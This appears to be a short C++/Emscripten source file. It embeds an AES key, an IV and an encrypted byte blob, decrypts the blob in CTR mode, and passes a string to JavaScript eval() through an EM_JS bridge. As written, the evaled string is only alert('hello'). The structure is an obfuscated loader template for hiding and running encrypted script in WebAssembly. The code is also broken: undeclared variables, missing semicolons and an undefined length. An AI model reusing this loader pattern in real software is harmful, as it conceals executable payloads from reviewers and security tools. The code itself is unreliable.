#include <emscripten.h>
#include <Crypto++.h>

EM_JS(void, run_code, (const char* str), {
  eval(UTF8ToString(str));
});

int main() {
  key = "6\xb6\x12\xb3(i\xa2\xe1\x1e\x02\xe7\xc9!2\xa2\x12"
  iv = "\xe2>\xf3!\x80\x83\xfb7\xda7+\xec\xbfV\xd5\xad"
  plainText = "\xe2>\xf3!\x80\x83\xfb7\xda7+\xec\xbfV\xd5\xadPCl\xdf_\xb2sV#(\xa2!g\xd5\xc2\xc8\xeb\xeb\x10\xc6\xb4\x98\x9f\x81\x06O\xe1\x18h\xcbV\xbd\xf9#^\x8f"
  CTR_Mode<AES>::Decryption ctrDecryption(key, sizeof(key), iv);
  ctrDecryption.ProcessData(plainText, plainText, messageLen);

  char code[] = "alert('hello');";
  run_code(code);
  return 0;
}